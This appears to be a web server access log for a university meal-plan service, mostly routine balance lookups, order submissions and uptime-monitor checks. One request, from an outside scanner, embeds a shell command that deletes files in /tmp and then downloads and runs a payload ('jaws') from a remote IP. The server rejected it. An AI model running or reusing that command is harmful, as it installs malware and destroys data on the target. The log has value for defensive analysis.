41.79.97.5 - - [06/Nov/2023:09:49:24 +0000] "GET /API/api/getCurrentBalance/30002027 HTTP/1.1" 200 6341 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:26 +0000] "GET / HTTP/1.1" 302 5441 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:27 +0000] "GET /API/api/getCurrentBalance/95962026 HTTP/1.1" 200 1736 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:29 +0000] "GET /API/api/getCurrentBalance/95962026 HTTP/1.1" 200 1736 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:35 +0000] "GET /API/api/getCurrentBalance/69542022 HTTP/1.1" 200 6325 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:39 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1501 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:49:45 +0000] "GET /API/api/getCurrentBalance/59672026 HTTP/1.1" 200 1735 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:48 +0000] "-" 408 5180 "-" "-"
41.79.97.5 - - [06/Nov/2023:09:49:46 +0000] "GET /API/api/getCurrentBalance/227392026 HTTP/1.1" 200 1021 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:51 +0000] "GET /API/api/getCurrentBalance/227392026 HTTP/1.1" 200 1037 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:49:53 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1503 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:49:53 +0000] "GET /API/api/getCurrentBalance/27392026 HTTP/1.1" 200 1742 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:05 +0000] "GET /API/api/getCurrentBalance/27392026 HTTP/1.1" 200 1758 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:50:07 +0000] "HEAD /pos HTTP/1.1" 301 5366 "https://mplan.ashesi.edu.gh/pos" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:50:07 +0000] "HEAD /pos/ HTTP/1.1" 200 867 "https://mplan.ashesi.edu.gh/pos" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:50:08 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1505 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:13 +0000] "GET /API/api/getCurrentBalance/47702026 HTTP/1.1" 200 1749 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:50:16 +0000] "-" 408 575 "-" "-"
41.79.97.5 - - [06/Nov/2023:09:50:16 +0000] "GET /API/api/getCurrentBalance/47702026 HTTP/1.1" 200 1749 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:21 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1502 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:25 +0000] "GET /API/api/getCurrentBalance/37402026 HTTP/1.1" 200 1724 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:28 +0000] "GET /API/api/getCurrentBalance/89962026 HTTP/1.1" 200 6319 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:33 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1505 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:33 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1499 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:51 +0000] "GET /API/api/getCurrentBalance/69542022 HTTP/1.1" 200 1736 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:50:53 +0000] "GET /API/api/getCurrentBalance/69542022 HTTP/1.1" 200 1736 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:01 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1491 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:51:10 +0000] "GET /API/api/getCurrentBalance/41272026 HTTP/1.1" 200 1732 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:51:16 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1503 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:19 +0000] "GET /API/api/getCurrentBalance/78032026 HTTP/1.1" 200 1746 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:25 +0000] "GET /API/api/getCurrentBalance/30512027 HTTP/1.1" 200 1754 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:26 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1489 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:28 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1030 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:51:38 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1485 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:51:58 +0000] "HEAD /vendor/public/admin HTTP/1.1" 302 6085 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:51:58 +0000] "HEAD /vendor/public/admin/login HTTP/1.1" 200 1428 "https://mplan.ashesi.edu.gh/vendor/public/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:52:04 +0000] "GET /API/api/getCurrentBalance/66032026 HTTP/1.1" 200 1730 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:52:25 +0000] "-" 408 575 "-" "-"
41.79.97.5 - - [06/Nov/2023:09:52:32 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1501 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
156.205.52.217 - - [06/Nov/2023:09:52:52 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+91.92.243.35/jaws;sh+/tmp/jaws HTTP/1.1" 404 488 "-" "Hello, world"
41.79.97.5 - - [06/Nov/2023:09:52:55 +0000] "GET /subscriber/ HTTP/1.1" 301 608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:55 +0000] "GET /subscriber/ HTTP/1.1" 200 5902 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:55 +0000] "GET /subscriber/assets/index-e7c9cb4e.js HTTP/1.1" 200 187467 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:55 +0000] "GET /subscriber/ HTTP/1.1" 200 5918 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:55 +0000] "GET /subscriber/assets/index-919520b5.css HTTP/1.1" 200 6623 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:56 +0000] "GET /subscriber/assets/index-919520b5.css HTTP/1.1" 200 6623 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:56 +0000] "GET /subscriber/assets/index-e7c9cb4e.js HTTP/1.1" 200 192632 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:59 +0000] "GET /subscriber/assets/headerimg-5519f95f.png HTTP/1.1" 200 1760353 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
41.79.97.5 - - [06/Nov/2023:09:52:58 +0000] "GET /subscriber/assets/headerimg-5519f95f.png HTTP/1.1" 200 1760353 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
::1 - - [06/Nov/2023:09:53:07 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
41.79.97.5 - - [06/Nov/2023:09:53:37 +0000] "GET /API/api/getCurrentBalance/95962026 HTTP/1.1" 200 6309 "https://mplan.ashesi.edu.gh/subscriber/" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
154.160.0.223 - - [06/Nov/2023:09:53:55 +0000] "GET /API/api/getCurrentBalance/008672026 HTTP/1.1" 200 1037 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:53:58 +0000] "HEAD /subscriber HTTP/1.1" 301 5373 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:53:58 +0000] "HEAD /subscriber/ HTTP/1.1" 200 866 "https://mplan.ashesi.edu.gh/subscriber" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:54:09 +0000] "GET /API/api/getCurrentBalance/86832026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:54:11 +0000] "GET /API/api/getCurrentBalance/86832026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
216.144.248.27 - - [06/Nov/2023:09:54:13 +0000] "HEAD /admin HTTP/1.1" 301 5368 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:54:13 +0000] "HEAD /admin/ HTTP/1.1" 302 1548 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.144.248.27 - - [06/Nov/2023:09:54:14 +0000] "HEAD /admin/admin/login HTTP/1.1" 200 1498 "https://mplan.ashesi.edu.gh/admin" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.79.97.5 - - [06/Nov/2023:09:54:13 +0000] "GET /API/api/getCurrentBalance/86832026 HTTP/1.1" 200 1734 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:54:13 +0000] "GET /API/api/getCurrentBalance/08672026 HTTP/1.1" 200 1743 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:54:15 +0000] "GET /API/api/getCurrentBalance/08672026 HTTP/1.1" 200 1727 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
41.79.97.5 - - [06/Nov/2023:09:54:16 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1486 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
154.160.0.223 - - [06/Nov/2023:09:54:19 +0000] "PUT /API/api/make_order HTTP/1.1" 200 1502 "https://mplan.ashesi.edu.gh/pos/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
